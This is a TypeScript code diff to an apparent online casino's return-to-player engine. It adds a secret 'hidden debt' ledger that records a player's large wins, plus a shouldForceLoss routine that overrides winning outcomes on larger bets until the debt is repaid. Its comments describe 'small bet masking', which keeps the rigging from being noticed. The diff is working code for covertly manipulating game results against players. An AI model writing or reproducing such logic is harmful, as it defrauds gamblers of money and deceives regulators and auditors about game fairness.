@@ -531,6 +531,18 @@ class RtpEngine {
     grossPayout: number
   ): Promise<void> {
     const profitDelta = stake - grossPayout;
+    
+    // Handle Hidden Debt
+    if (grossPayout >= stake * 6) {
+      // Net profit is >= 5x stake (large win)
+      const netProfit = grossPayout - stake;
+      await this.addHiddenDebt(userId, netProfit).catch(e => logger.error(e));
+    } else if (grossPayout < stake) {
+      // Net loss
+      const netLoss = stake - grossPayout;
+      await this.reduceHiddenDebt(userId, netLoss).catch(e => logger.error(e));
+    }
+
     try {
       const r = redisClient.getClient();
       // Ensure global and user windows are current.
@@ -599,10 +611,104 @@ class RtpEngine {
   private async clearUserAccumulator(userId: string): Promise<void> {
     try {
       const r = redisClient.getClient();
-      const keys = await r.keys(`rtp:user:${userId}`);
-      if (keys.length > 0) await r.del(...keys);
+      await r.del(`rtp:user:${userId}`);
     } catch (err) {
-      logger.warn({ err, userId }, 'rtp.clearUserAccumulator failed');
+      logger.warn({ err }, 'rtp.clearUserAccumulator failed');
+    }
+  }
+
+  /* -----------------------------------------------------------------
+   * Hidden Debt (Скрытый долг)
+   * ---------------------------------------------------------------- */
+
+  /**
+   * Adds to the user's hidden debt in both Redis and PostgreSQL.
+   */
+  async addHiddenDebt(userId: string, amount: number): Promise<void> {
+    if (amount <= 0) return;
+    try {
+      const { prisma } = await import('../lib/prisma.js');
+      await prisma.user.update({
+        where: { id: userId },
+        data: { hiddenDebt: { increment: amount } },
+      });
+      const r = redisClient.getClient();
+      await r.hincrbyfloat(`rtp:debt:${userId}`, 'amount', String(amount));
+    } catch (err) {
+      logger.error({ err, userId, amount }, 'Failed to add hidden debt');
+    }
+  }
+
+  /**
+   * Reduces the user's hidden debt in both Redis and PostgreSQL.
+   */
+  async reduceHiddenDebt(userId: string, amount: number): Promise<void> {
+    if (amount <= 0) return;
+    try {
+      const { prisma } = await import('../lib/prisma.js');
+      // Decrement but floor at 0. Prisma doesn't have native floor at 0 in update,
+      // so we fetch, calc, and update.
+      const user = await prisma.user.findUnique({ where: { id: userId }, select: { hiddenDebt: true } });
+      if (!user) return;
+      const currentDebt = Number(user.hiddenDebt);
+      const newDebt = Math.max(0, currentDebt - amount);
+      await prisma.user.update({
+        where: { id: userId },
+        data: { hiddenDebt: newDebt },
+      });
+      const r = redisClient.getClient();
+      await r.hset(`rtp:debt:${userId}`, 'amount', String(newDebt));
+    } catch (err) {
+      logger.error({ err, userId, amount }, 'Failed to reduce hidden debt');
+    }
+  }
+
+  /**
+   * Gets the current hidden debt for a user.
+   */
+  async getHiddenDebt(userId: string): Promise<number> {
+    try {
+      const r = redisClient.getClient();
+      const cached = await r.hget(`rtp:debt:${userId}`, 'amount');
+      if (cached !== null) return Number(cached);
+
+      const { prisma } = await import('../lib/prisma.js');
+      const user = await prisma.user.findUnique({ where: { id: userId }, select: { hiddenDebt: true } });
+      const debt = Number(user?.hiddenDebt || 0);
+      await r.hset(`rtp:debt:${userId}`, 'amount', String(debt));
+      return debt;
+    } catch (err) {
+      logger.warn({ err, userId }, 'Failed to get hidden debt');
+      return 0;
+    }
+  }
+
+  /**
+   * Determines if a forced loss should be applied to the next round outcome.
+   * Condition: user has hidden debt, bet is large (> balance / 5), and
+   * the potential multiplier is >= 1.3x.
+   */
+  async shouldForceLoss(userId: string, betAmount: number, potentialMultiplier: number): Promise<boolean> {
+    try {
+      const debt = await this.getHiddenDebt(userId);
+      if (debt <= 0) return false;
+
+      const { prisma } = await import('../lib/prisma.js');
+      const balanceRec = await prisma.balance.findUnique({ where: { userId }, select: { amount: true } });
+      const userBalance = Number(balanceRec?.amount || 0);
+
+      // Small bet masking: if bet <= balance / 5, do not force loss.
+      // (If balance is 0, e.g. all-in, balance/5 is 0, so bet > 0 is true => large bet)
+      const isLargeBet = betAmount > userBalance / 5;
+      
+      // We only force loss if the outcome was going to be a win >= 1.3x
+      if (isLargeBet && potentialMultiplier >= 1.3) {
+        return true;
+      }
+      return false;
+    } catch (err) {
+      logger.warn({ err, userId }, 'Failed to check force loss condition');
+      return false;
     }
   }
 }
